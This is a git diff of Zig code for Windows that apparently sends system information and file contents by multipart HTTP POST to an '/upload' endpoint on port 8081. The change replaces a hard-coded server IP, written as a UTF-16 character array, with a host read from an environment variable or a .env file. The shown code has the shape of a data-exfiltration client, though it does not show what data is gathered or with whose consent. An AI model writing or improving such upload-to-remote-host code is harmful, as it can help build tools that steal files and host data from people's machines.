@@ -73,11 +73,43 @@ const WINHTTP = struct {
 
 // Fixed UTF-16 strings
 const USER_AGENT = [_:0]u16{ 'Z', 'i', 'g', ' ', 'S', 'y', 's', 't', 'e', 'm', ' ', 'I', 'n', 'f', 'o' };
-const SERVER_HOST = [_:0]u16{ '1', '5', '0', '.', '9', '5', '.', '1', '1', '4', '.', '1', '2', '0' };
 const POST_METHOD = [_:0]u16{ 'P', 'O', 'S', 'T' };
 const UPLOAD_PATH = [_:0]u16{ '/', 'u', 'p', 'l', 'o', 'a', 'd' };
 const BOUNDARY = [_:0]u16{ '-', '-', 'b', 'o', 'u', 'n', 'd', 'a', 'r', 'y', '1', '2', '3', '4', '5' };
 const CONTENT_TYPE_HEADER = [_:0]u16{ 'C', 'o', 'n', 't', 'e', 'n', 't', '-', 'T', 'y', 'p', 'e', ':', ' ', 'm', 'u', 'l', 't', 'i', 'p', 'a', 'r', 't', '/', 'f', 'o', 'r', 'm', '-', 'd', 'a', 't', 'a', ';', ' ', 'b', 'o', 'u', 'n', 'd', 'a', 'r', 'y', '=', '-', '-', 'b', 'o', 'u', 'n', 'd', 'a', 'r', 'y', '1', '2', '3', '4', '5', '\r', '\n' };
+
+// Thêm hàm helper để chuyển đổi string sang UTF-16
+fn stringToUtf16(allocator: std.mem.Allocator, input: []const u8) ![:0]u16 {
+    return try std.unicode.utf8ToUtf16LeWithNull(allocator, input);
+}
+
+// Thêm hàm để đọc .env
+fn getEnvValue(allocator: std.mem.Allocator, key: []const u8) ![]const u8 {
+    // Thử đọc từ environment variable trước
+    if (std.process.getEnvVarOwned(allocator, key)) |value| {
+        return value;
+    } else |_| {
+        // Nếu không có env var, đọc từ file .env
+        const env_file = try std.fs.cwd().openFile(".env", .{});
+        defer env_file.close();
+
+        const content = try env_file.readToEndAlloc(allocator, 1024 * 1024);
+        defer allocator.free(content);
+
+        var lines = std.mem.split(u8, content, "\n");
+        while (lines.next()) |line| {
+            var parts = std.mem.split(u8, line, "=");
+            if (parts.next()) |k| {
+                if (std.mem.eql(u8, std.mem.trim(u8, k, " "), key)) {
+                    if (parts.next()) |v| {
+                        return allocator.dupe(u8, std.mem.trim(u8, v, " \r"));
+                    }
+                }
+            }
+        }
+        return error.EnvVarNotFound;
+    }
+}
 
 pub fn sendSystemInfo() !void {
     var gpa = std.heap.GeneralPurposeAllocator(.{}){};
@@ -110,11 +142,19 @@ pub fn sendSystemInfo() !void {
     }
 }
 
-// Helper function to send file contents
+// Thay đổi hàm sendFileContent để sử dụng server host từ .env
 fn sendFileContent(file_content: []const u8, file_name: []const u8) !void {
     var gpa = std.heap.GeneralPurposeAllocator(.{}){};
     const allocator = gpa.allocator();
     defer _ = gpa.deinit();
+
+    // Đọc server host từ .env
+    const server_host = try getEnvValue(allocator, "SERVER_HOST");
+    defer allocator.free(server_host);
+
+    // Chuyển đổi server host thành UTF-16
+    const server_host_utf16 = try stringToUtf16(allocator, server_host);
+    defer allocator.free(server_host_utf16);
 
     // Create form-data body
     var form_data = std.ArrayList(u8).init(allocator);
@@ -150,7 +190,7 @@ fn sendFileContent(file_content: []const u8, file_name: []const u8) !void {
     // Connect to server
     const hConnect = WINHTTP.WinHttpConnect(
         hSession,
-        &SERVER_HOST,
+        server_host_utf16,
         8081,
         0,
     ) orelse return error.WinHttpConnectFailed;
